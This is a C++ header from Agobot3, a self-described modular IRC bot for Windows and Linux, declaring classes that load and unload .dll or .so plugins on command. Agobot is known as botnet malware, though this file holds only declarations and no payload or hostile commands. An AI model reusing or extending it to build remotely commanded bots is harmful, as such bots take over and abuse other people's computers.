/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __CPLUGIN_H__
#define __CPLUGIN_H__

#include "cvar.h"
#include "commands.h"
#include "message.h"
#include "irc.h"

class CPlugin;
class CPluginLoader;

typedef bool (*InitFunc)(void *pMainCtrl, CPlugin *pPlugin);
typedef void (*ShutdownFunc)();
typedef bool (*HandleCommandFunc)(CMessage *pMsg);

class CPlugin : public CCommandHandler
{
public:
						 CPlugin();						// Constructor
	virtual				~CPlugin();						// Destructor

	bool				 Load(CString &sFilename);		// Load a plugin
	void				 Unload();						// Unload this plugin
	bool				 Init();						// Initialize this plugin
	bool				 HandleCommand(CMessage *pMsg);	// Distribute a command to this plugin
private:
#ifdef WIN32
	HMODULE				 m_hPlugin;						// The handle to the .dll file
#else
	void				*m_hPlugin;						// The handle to the .so file
#endif // WIN32

	InitFunc			 m_pfnInit;						// Pointer to plugins Init() function
	ShutdownFunc		 m_pfnShutdown;					// Pointer to plugins Shutdown() function
	HandleCommandFunc	 m_pfnHandleCommand;			// Pointer to plugins HandleCommand() function
};

class CPluginLoader : public CCommandHandler
{
public:
						 CPluginLoader();				// Constructor
	virtual				~CPluginLoader();				// Destructor

	bool				 HandleCommand(CMessage *pMsg);	// Command handler

	command				 m_cmdLoad, m_cmdUnload;		// Commands
	void				 Init();						// Initialization
};

#endif // __CPLUGIN_H__
